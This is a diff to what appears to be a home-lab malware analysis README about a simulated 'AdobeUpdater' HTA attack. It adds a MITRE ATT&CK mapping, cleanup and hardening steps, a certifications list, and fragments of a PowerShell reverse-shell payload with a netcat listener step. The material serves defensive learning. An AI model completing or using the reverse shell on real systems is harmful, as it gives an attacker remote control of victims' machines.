@@ -219,6 +219,74 @@ This section highlights suspicious process behavior observed using Sysinternals 
 ---
 
 
+## 📃 MITRE ATT&CK Mapping
+
+| Technique         | ID         | Description                        |
+|------------------|------------|------------------------------------|
+| Initial Access    | T1204.002  | User Execution via HTA             |
+| Execution         | T1059.001  | PowerShell                         |
+| Persistence       | T1547.001  | Registry Run Key                   |
+| Defense Evasion   | T1218.005  | LOLBAS via `wscript.exe`           |
+| Command & Control | T1071.001  | Reverse Shell over TCP             |
+
+
+---
+
+## 🔧 Remediation and Recommendations
+
+### 🧹 Immediate Cleanup
+
+- **Delete the following malicious files from disk:**
+ `C:\Users\IEUser\Downloads\Test Malware\AdobeUpdater\AdobeUpdater.hta`
+- Any downloaded reverse shell payloads saved to `%TEMP%`
+- **Remove registry-based persistence:**
+  - Delete the `Run` key entry:
+    `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AdobeTaskHelper`
+
+---
+
+### 🔐 Credential Response
+
+- **Passwords.txt was exfiltrated.** All credentials listed in that file must be considered compromised and changed immediately.
+- Review logs to confirm there were no unauthorized logins using the compromised credentials.
+- Ensure password rotation policies are enforced for both local accounts and external services.
+- Investigate for signs of lateral movement or reuse of these credentials elsewhere in the environment.
+
+---
+
+### 🔒 System Hardening
+
+- **Block outbound traffic** to the attacker IP: `192.168.78.129` (or any future simulation IPs).
+- **Restrict execution of `.hta` and `.vbs` files** via Group Policy or application allowlisting.
+- **Disable Windows Script Host (WSH)** on systems where it is not required:
+ - Set the following registry key: 
+   `HKLM\Software\Microsoft\Windows Script Host\Settings`
+   `Enabled = 0`
+ 
+---
+
+## 📜 Certifications & Training
+
+- **Cyber Defense Certified Professional** – Vanguard 10 *(Level Effect)*  
+- **Practical Malware Analysis & Triage** – TCM Security  
+- **zSecurity Course Certification** – Ethical Hacking  
+- **Practical SOC Analyst Associate (PSAA)** *(planned)*  
+- **Associate of Applied Science** – Information Technology Specialist  
+  *University of Alaska Fairbanks – 2023*
+
+> Built, not bought. These certs represent real work — not checkbox training. Every one of them directly feeds into the lab above.
+
+---
+
+
+## 🚧 This section is under construction. **Full Lab Replication Coming Soon !🚧**  
+
+This section will include a full step-by-step guide for recreating the AdobeUpdater attack lab, including payload setup, reverse shell callback, and detection tuning.
+
+> ⚠️ Educational Use Only:  
+> The following code is shown as part of a red team simulation in a controlled lab environment. Do **not** use this on unauthorized systems.
+
+## Setup Instructions 
 ## 🧪 PowerShell Reverse Shell (Payload)
 
 ```powershell
@@ -234,23 +302,8 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
   $stream.Flush()
 }
 $client.Close()
+
 ```
-
----
-
-## 📃 MITRE ATT&CK Mapping
-
-| Technique         | ID         | Description                        |
-|------------------|------------|------------------------------------|
-| Initial Access    | T1204.002  | User Execution via HTA             |
-| Execution         | T1059.001  | PowerShell                         |
-| Persistence       | T1547.001  | Registry Run Key                   |
-| Defense Evasion   | T1218.005  | LOLBAS via `wscript.exe`           |
-| Command & Control | T1071.001  | Reverse Shell over TCP             |
-
----
-## **This section is not Completed** / **Full Lab Replication Coming Soon !**  
-## 🚧 Setup Instructions 
 
 1. **Start Netcat listener on Kali**
    ```bash
